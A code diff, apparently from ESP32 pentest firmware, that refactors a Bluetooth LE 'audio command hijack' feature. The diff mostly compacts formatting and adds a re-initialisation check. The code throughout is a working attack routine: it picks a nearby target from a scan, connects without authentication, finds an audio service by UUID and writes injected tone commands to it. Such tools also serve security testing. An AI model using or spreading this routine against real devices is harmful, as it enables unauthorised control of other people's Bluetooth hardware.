@@ -15,35 +15,25 @@ void AudioCommandService::AudioCmdCallbacks::onWrite(NimBLECharacteristic* pChar
 
 void AudioCommandService::begin() {
     if(isRunning) return;
-
-    NimBLEDevice::init("WhisperAudioCMD");
-    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
+    if(!NimBLEDevice::getInitialized()) {
+        NimBLEDevice::init("WhisperAudioCMD");
+        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+    }
     pServer = NimBLEDevice::createServer();
-
     pService = pServer->createService("19B10000-E8F2-537E-4F6C-D104768A1214");
-
     pAudioCmdChar = pService->createCharacteristic(
         "19B10001-E8F2-537E-4F6C-D104768A1214",
-        NIMBLE_PROPERTY::READ |
-        NIMBLE_PROPERTY::WRITE |
-        NIMBLE_PROPERTY::NOTIFY
+        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY
     );
-
     pAudioCmdChar->setCallbacks(new AudioCmdCallbacks());
-
     pAudioDataChar = pService->createCharacteristic(
         "19B10002-E8F2-537E-4F6C-D104768A1214",
-        NIMBLE_PROPERTY::WRITE_NR |
-        NIMBLE_PROPERTY::NOTIFY
+        NIMBLE_PROPERTY::WRITE_NR | NIMBLE_PROPERTY::NOTIFY
     );
-
     pService->start();
-
     NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
     pAdvertising->addServiceUUID(pService->getUUID());
     pAdvertising->start();
-
     isRunning = true;
 }
 
@@ -61,7 +51,6 @@ void AudioCommandService::sendAudioTone(uint8_t frequency, uint16_t duration_ms)
         (uint8_t)(frequency & 0xFF),
         (uint8_t)(duration_ms / 100)
     };
-
     sendAudioCommand((char*)toneCmd);
 }
 
@@ -77,33 +66,24 @@ bool attemptAudioCommandHijack(NimBLEAddress target) {
     drawMainBorderWithTitle("AUDIO HIJACK");
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     padprintln("Connecting...");
-
     NimBLEClient* pClient = NimBLEDevice::createClient();
-
     if(!pClient->connect(target)) {
         displayMessage("Failed to connect", "", "", "", TFT_WHITE);
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     padprintln("Connected");
     padprintln("Discovering...");
-
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID("19B10000-E8F2-537E-4F6C-D104768A1214"));
-    if(!pService) {
-        pService = pClient->getService(NimBLEUUID((uint16_t)0x1843));
-    }
-
+    if(!pService) pService = pClient->getService(NimBLEUUID((uint16_t)0x1843));
     if(!pService) {
         displayMessage("No audio service", "", "", "", TFT_WHITE);
         pClient->disconnect();
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     padprintln("Audio service found");
     padprintln("Sending tones...");
-
     uint16_t tones[] = {440, 550, 660, 770};
     for(int i = 0; i < 4; i++) {
         uint8_t toneCmd[7] = {
@@ -112,18 +92,12 @@ bool attemptAudioCommandHijack(NimBLEAddress target) {
             (uint8_t)(tones[i] & 0xFF),
             100
         };
-
         NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID("19B10001-E8F2-537E-4F6C-D104768A1214"));
-        if(pChar) {
-            pChar->writeValue(toneCmd, sizeof(toneCmd), false);
-        }
-
+        if(pChar) pChar->writeValue(toneCmd, sizeof(toneCmd), false);
         delay(200);
     }
-
     pClient->disconnect();
     NimBLEDevice::deleteClient(pClient);
-
     return true;
 }
 
@@ -131,21 +105,11 @@ void audioCommandHijackTest() {
     tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle("AUDIO CMD HIJACK");
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    
     String selectedMAC = selectTargetFromScan("SELECT TARGET");
     if(selectedMAC.isEmpty()) return;
-
     NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
-
-    if(!requireSimpleConfirmation("Start audio CMD hijack?")) {
-        return;
-    }
-
+    if(!requireSimpleConfirmation("Start audio CMD hijack?")) return;
     bool success = attemptAudioCommandHijack(target);
-
-    if(success) {
-        displayMessage("SUCCESS!", "Audio commands sent", "", "", TFT_GREEN);
-    } else {
-        displayMessage("FAILED", "No audio service", "", "", TFT_RED);
-    }
+    if(success) displayMessage("SUCCESS!", "Audio commands sent", "", "", TFT_GREEN);
+    else displayMessage("FAILED", "No audio service", "", "", TFT_RED);
 }
